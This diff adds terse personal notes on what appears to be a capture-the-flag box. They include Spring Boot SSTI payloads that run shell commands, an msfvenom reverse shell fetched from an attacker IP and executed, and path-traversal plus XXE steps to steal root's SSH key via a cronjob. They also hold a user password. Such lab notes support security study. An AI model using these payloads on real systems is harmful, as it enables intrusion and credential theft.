@@ -1,0 +1,98 @@
+# searching
+	- test for sqli
+	
+# enum
+	- dirbuster
+
+
+# Sprint booot
+	- SSTI
+		*{4*4}
+		${...}: Variable expressions – in practice, these are OGNL or Spring EL expressions.
+		*{...}: Selection expressions – similar to variable expressions but used for specific purposes.
+		#{...}: Message (i18n) expressions – used for internationalization.
+		@{...}: Link (URL) expressions – used to set correct URLs/paths in the application.
+		~{...}: Fragment expressions – they let you reuse parts of templates.
+	- Banned char:
+		$
+		~
+
+	## java getRuntime exec
+		- payload
+			*{T(java.lang.Runtime).getRuntime().exec('sh -c ls')}
+		- gen linux rev with msfvenom:
+			msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.89 LPORT=9099 -f elf > r.elf
+		- to get rev shell 
+			*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("wget 10.10.14.89/r.elf")}
+
+			*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("chmod 777 ./r.elf")}
+
+			*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("./r.elf")}
+
+		python3 -c 'import pty; pty.spawn("/bin/bash")'
+		export TERM=xterm
+
+
+# priv esc analyze
+	- pspy64
+		timeout 10s ./pspy64
+
+	- list uid 0:
+		sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
+
+		/bin/sh -c sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
+
+		java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar
+
+	- read the final-1.0-jar-with-dependencies.jar
+		# /opt/panda_search/redpanda.log
+		- multi-lines
+			- line: 
+				int(status_code)||ip||user_agent||uri
+
+
+		artirst = getArtist(uri)
+			getArtist
+				"/opt/panda_search/src/main/resources/static" + uri
+					description of Tag['Artist']
+
+
+		addViewTo("/credits/" + artist + "_creds.xml", parsed_data.get("uri").toString())
+			addViewTo(String path, String uri)
+			// path = "/credits/" + artist + "_creds.xml"
+			// uri = uri
+
+				- load xml form file PATH.
+					xml format
+						<root>
+							<image>
+								<uri></uri>
+								<views></views>
+							</image>
+							<totalviews></totalviews>
+						</root>
+				- up date value of total view and the image has the uri == uri (param).
+				- write out the updated xml file to file.
+
+
+# step to priv esc
+
+	- use exiftool to create image with Author tag contains path traversal payload to point to /tmp/gg_creds.xml
+		exiftool -Artist="../tmp/gg"  KL.jpg
+
+	- draft the /tmp/gg_creds.xml contains xxe payload to read /root/.ssh/id_rsa
+
+	- edit the "/opt/panda_search/redpanda.log" file (need to SSTI connect back to have group logs)
+		echo "222||a||a||/../../../../../../tmp/pe_exploit.jpg" > /opt/panda_search/redpanda.log
+
+	- wait for cronjob to run; then cat the /tmp/gg_creds.xml to get id_rsa value.
+
+	- use id_rsa to connect to box with root permission.
+	
+
+# moreover
+	- get password of user
+		from panda_search-0.0.1-SNAPSHOT, we got password of woodenk
+			RedPandazRule
+
+			
